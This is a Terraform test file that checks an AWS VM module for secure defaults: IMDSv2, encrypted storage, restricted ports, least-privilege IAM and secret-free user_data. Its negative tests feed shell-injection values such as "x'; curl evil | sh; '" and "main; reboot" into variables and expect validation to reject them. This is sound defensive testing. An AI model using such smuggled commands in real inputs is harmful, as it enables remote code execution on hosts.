# Offline test against a mocked AWS provider: terraform test needs no credentials.

mock_provider "aws" {
  mock_data "aws_region" {
    defaults = {
      region = "us-east-1"
    }
  }

  mock_data "aws_caller_identity" {
    defaults = {
      account_id = "123456789012"
    }
  }

  mock_data "aws_ami" {
    defaults = {
      id = "ami-0123456789abcdef0"
    }
  }

  mock_resource "aws_iam_role" {
    defaults = {
      arn = "arn:aws:iam::123456789012:role/tst-vm"
    }
  }

  mock_resource "aws_eip" {
    defaults = {
      public_ip = "203.0.113.10"
    }
  }
}

variables {
  name     = "tst"
  repo_url = "https://example.com/org/zqhoot.git"
  repo_ref = "v1.0.0"
  domain   = "quiz.example.com"
}

run "instance_defaults" {
  command = apply

  assert {
    condition     = aws_instance.this.instance_type == "t4g.small"
    error_message = "the default instance type is t4g.small"
  }

  assert {
    condition     = data.aws_ami.ubuntu.owners == tolist(["099720109477"]) && data.aws_ami.ubuntu.most_recent
    error_message = "the AMI comes from Canonical (099720109477), most recent"
  }

  assert {
    condition = anytrue([
      for f in data.aws_ami.ubuntu.filter :
      f.name == "name" && contains(f.values, "ubuntu/images/hvm-ssd-gp3/ubuntu-noble-24.04-arm64-server-*")
    ])
    error_message = "the AMI name filter selects Ubuntu 24.04 (noble) arm64 server images"
  }

  assert {
    condition     = one(aws_instance.this.metadata_options).http_tokens == "required" && one(aws_instance.this.metadata_options).http_endpoint == "enabled"
    error_message = "IMDSv2 must be required"
  }

  assert {
    condition = (
      one(aws_instance.this.root_block_device).volume_type == "gp3" &&
      one(aws_instance.this.root_block_device).encrypted &&
      one(aws_instance.this.root_block_device).volume_size == 20
    )
    error_message = "encrypted 20 GB gp3 root volume"
  }

  assert {
    condition     = output.ssm_parameter_path == "/zqhoot/tst" && output.public_ip == "203.0.113.10"
    error_message = "outputs: ssm_parameter_path and public_ip"
  }
}

run "network_exposure" {
  command = apply

  assert {
    condition = (
      length(aws_vpc_security_group_ingress_rule.web) == 4 &&
      alltrue([for r in aws_vpc_security_group_ingress_rule.web : r.ip_protocol == "tcp" && contains([80, 443], r.from_port) && r.from_port == r.to_port]) &&
      length(aws_vpc_security_group_ingress_rule.ssh) == 0
    )
    error_message = "only 80 and 443 are open by default; SSH stays closed"
  }

  assert {
    condition = (
      length([for r in aws_vpc_security_group_ingress_rule.web : r if r.cidr_ipv4 == "0.0.0.0/0"]) == 2 &&
      length([for r in aws_vpc_security_group_ingress_rule.web : r if r.cidr_ipv6 == "::/0"]) == 2
    )
    error_message = "web ports are open to 0.0.0.0/0 and ::/0"
  }
}

run "ssh_only_when_asked" {
  command = apply

  variables {
    ssh_cidr = "203.0.113.7/32"
  }

  assert {
    condition     = length(aws_vpc_security_group_ingress_rule.ssh) == 1 && aws_vpc_security_group_ingress_rule.ssh[0].from_port == 22 && aws_vpc_security_group_ingress_rule.ssh[0].cidr_ipv4 == "203.0.113.7/32"
    error_message = "ssh_cidr opens port 22 to exactly that CIDR"
  }
}

run "instance_role_is_least_privilege" {
  command = apply

  assert {
    condition     = aws_iam_role_policy_attachment.ssm_core.policy_arn == "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
    error_message = "the instance uses AmazonSSMManagedInstanceCore for Session Manager"
  }

  assert {
    condition = alltrue([
      for s in jsondecode(aws_iam_role_policy.parameters.policy).Statement :
      alltrue([for a in tolist(s.Action) : !strcontains(a, "*")])
    ])
    error_message = "no wildcard actions"
  }

  assert {
    condition = anytrue([
      for s in jsondecode(aws_iam_role_policy.parameters.policy).Statement :
      join(",", tolist(s.Action)) == "ssm:GetParameter,ssm:GetParameters,ssm:GetParametersByPath" &&
      join(",", tolist(s.Resource)) == "arn:aws:ssm:us-east-1:123456789012:parameter/zqhoot/tst,arn:aws:ssm:us-east-1:123456789012:parameter/zqhoot/tst/*"
    ])
    error_message = "parameter reads are limited to /zqhoot/{name}"
  }

  assert {
    condition = anytrue([
      for s in jsondecode(aws_iam_role_policy.parameters.policy).Statement :
      join(",", tolist(s.Action)) == "kms:Decrypt" &&
      s.Condition.StringEquals["kms:ViaService"] == "ssm.us-east-1.amazonaws.com"
    ])
    error_message = "kms:Decrypt only via SSM"
  }
}

run "user_data_installs_the_stack_and_carries_no_secrets" {
  command = apply

  assert {
    condition = alltrue([
      strcontains(aws_instance.this.user_data, "docker.io docker-compose-v2"),
      strcontains(aws_instance.this.user_data, "git clone 'https://example.com/org/zqhoot.git' /opt/zqhoot"),
      strcontains(aws_instance.this.user_data, "ref='v1.0.0'"),
      strcontains(aws_instance.this.user_data, "ZQ_SSM_PATH='/zqhoot/tst'"),
      strcontains(aws_instance.this.user_data, "ZQ_DOMAIN='quiz.example.com'"),
      strcontains(aws_instance.this.user_data, "docker.service"),
      strcontains(aws_instance.this.user_data, "docker compose -f deploy/vm/docker-compose.yml up -d --build"),
      strcontains(aws_instance.this.user_data, "chmod 600"),
      strcontains(aws_instance.this.user_data, "systemctl enable zqhoot.service"),
    ])
    error_message = "user_data must install Docker, clone the repo, and register the systemd unit and env fetcher"
  }

  # The environment arrives through SSM at boot, never through user_data.
  assert {
    condition = alltrue([
      for secret_name in ["ZQ_JWT_SECRET", "ZQ_ADMIN_PASSWORD", "aws_secret_access_key", "AKIA"] :
      !strcontains(aws_instance.this.user_data, secret_name)
    ])
    error_message = "user_data must not contain secrets"
  }
}

run "repo_url_cannot_break_out_of_the_shell_quoting" {
  command = plan

  variables {
    repo_url = "https://example.com/x'; curl evil | sh; '"
  }

  expect_failures = [var.repo_url]
}

run "repo_ref_is_restricted" {
  command = plan

  variables {
    repo_ref = "main; reboot"
  }

  expect_failures = [var.repo_ref]
}

run "instance_type_must_be_arm64" {
  command = plan

  variables {
    instance_type = "t3.small"
  }

  expect_failures = [var.instance_type]
}

run "ssh_cidr_must_be_a_cidr" {
  command = plan

  variables {
    ssh_cidr = "my-laptop"
  }

  expect_failures = [var.ssh_cidr]
}

run "subnet_needs_vpc" {
  command = plan

  variables {
    subnet_id = "subnet-0123456789abcdef0"
  }

  expect_failures = [var.vpc_id]
}
